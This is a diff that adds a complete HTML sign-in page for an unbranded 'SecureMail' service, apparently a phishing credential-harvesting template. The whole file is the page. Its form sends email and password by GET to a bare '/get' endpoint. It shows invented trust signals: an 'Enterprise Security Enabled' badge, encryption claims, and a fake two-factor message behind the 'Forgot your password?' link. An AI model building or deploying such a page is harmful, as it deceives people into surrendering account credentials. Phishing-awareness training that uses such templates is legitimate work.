@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureMail - Sign In</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f4c75 0%, #3282b8 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+        }
+        .email-logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #0f4c75, #3282b8);
+            border-radius: 15px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            box-shadow: 0 8px 20px rgba(15, 76, 117, 0.3);
+        }
+        .service-name {
+            color: #0f4c75;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+        .security-badge {
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            display: inline-block;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #0f4c75;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e8ed;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+            box-sizing: border-box;
+            background: #f8f9fa;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #3282b8;
+            background: white;
+            box-shadow: 0 0 12px rgba(50, 130, 184, 0.15);
+        }
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #0f4c75 0%, #3282b8 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(15, 76, 117, 0.3);
+        }
+        .forgot-password {
+            margin-top: 15px;
+            text-align: center;
+        }
+        .forgot-password a {
+            color: #3282b8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .features {
+            margin-top: 25px;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: left;
+        }
+        .features h4 {
+            color: #0f4c75;
+            margin: 0 0 12px 0;
+            font-size: 16px;
+        }
+        .feature-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .feature-list li {
+            padding: 5px 0;
+            font-size: 13px;
+            color: #666;
+        }
+        .feature-list li:before {
+            content: "✓ ";
+            color: #27ae60;
+            font-weight: bold;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3282b8;
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .email-domain {
+            position: relative;
+        }
+        .domain-suggestions {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: white;
+            border: 2px solid #e1e8ed;
+            border-top: none;
+            border-radius: 0 0 10px 10px;
+            max-height: 120px;
+            overflow-y: auto;
+            z-index: 10;
+            display: none;
+        }
+        .domain-suggestion {
+            padding: 10px 15px;
+            cursor: pointer;
+            font-size: 14px;
+            color: #666;
+        }
+        .domain-suggestion:hover {
+            background: #f8f9fa;
+            color: #0f4c75;
+        }
+        .two-factor {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #856404;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="email-logo">📧</div>
+        <div class="service-name">SecureMail</div>
+        <p class="subtitle">Professional Email Service</p>
+        
+        <div class="security-badge">
+            🔒 Enterprise Security Enabled
+        </div>
+        
+        <form action="/get" method="GET" id="loginForm">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <div class="email-domain">
+                    <input type="text" id="email" name="email" placeholder="your.email@company.com" required>
+                    <div class="domain-suggestions" id="domainSuggestions">
+                        <div class="domain-suggestion" onclick="selectDomain('@gmail.com')">@gmail.com</div>
+                        <div class="domain-suggestion" onclick="selectDomain('@outlook.com')">@outlook.com</div>
+                        <div class="domain-suggestion" onclick="selectDomain('@yahoo.com')">@yahoo.com</div>
+                        <div class="domain-suggestion" onclick="selectDomain('@company.com')">@company.com</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your secure password" required>
+            </div>
+            
+            <div class="two-factor" id="twoFactor">
+                <strong>Two-Factor Authentication Required</strong><br>
+                Please check your mobile device for the authentication code.
+            </div>
+            
+            <button type="submit" class="login-btn">Sign In to Mail</button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Authenticating your account...</p>
+            </div>
+        </form>
+        
+        <div class="forgot-password">
+            <a href="#" onclick="showTwoFactor()">Forgot your password?</a>
+        </div>
+        
+        <div class="features">
+            <h4>🌟 Premium Features</h4>
+            <ul class="feature-list">
+                <li>End-to-end encryption</li>
+                <li>Advanced spam protection</li>
+                <li>50GB secure storage</li>
+                <li>Mobile sync across devices</li>
+                <li>Priority customer support</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            document.querySelector('.login-btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+        });
+        
+        // Email domain suggestions
+        document.getElementById('email').addEventListener('input', function(e) {
+            const value = e.target.value;
+            const suggestions = document.getElementById('domainSuggestions');
+            
+            if (value.includes('@')) {
+                suggestions.style.display = 'none';
+            } else if (value.length > 0) {
+                suggestions.style.display = 'block';
+            } else {
+                suggestions.style.display = 'none';
+            }
+        });
+        
+        // Hide suggestions when clicking outside
+        document.addEventListener('click', function(e) {
+            if (!e.target.closest('.email-domain')) {
+                document.getElementById('domainSuggestions').style.display = 'none';
+            }
+        });
+        
+        function selectDomain(domain) {
+            const input = document.getElementById('email');
+            const currentValue = input.value.split('@')[0];
+            input.value = currentValue + domain;
+            document.getElementById('domainSuggestions').style.display = 'none';
+            input.focus();
+        }
+        
+        function showTwoFactor() {
+            document.getElementById('twoFactor').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('twoFactor').style.display = 'none';
+            }, 5000);
+        }
+        
+        // Email validation
+        document.getElementById('email').addEventListener('blur', function(e) {
+            const email = e.target.value;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            
+            if (email && !emailRegex.test(email)) {
+                e.target.style.borderColor = '#e74c3c';
+                e.target.style.background = '#fdf2f2';
+            } else if (email) {
+                e.target.style.borderColor = '#27ae60';
+                e.target.style.background = '#f2fdf2';
+            }
+        });
+        
+        // Password strength indicator
+        document.getElementById('password').addEventListener('input', function(e) {
+            const password = e.target.value;
+            const strength = calculatePasswordStrength(password);
+            
+            if (strength < 3) {
+                e.target.style.borderColor = '#e74c3c';
+            } else if (strength < 5) {
+                e.target.style.borderColor = '#f39c12';
+            } else {
+                e.target.style.borderColor = '#27ae60';
+            }
+        });
+        
+        function calculatePasswordStrength(password) {
+            let strength = 0;
+            if (password.length >= 8) strength++;
+            if (/[a-z]/.test(password)) strength++;
+            if (/[A-Z]/.test(password)) strength++;
+            if (/[0-9]/.test(password)) strength++;
+            if (/[^A-Za-z0-9]/.test(password)) strength++;
+            return strength;
+        }
+    </script>
+</body>
+</html>
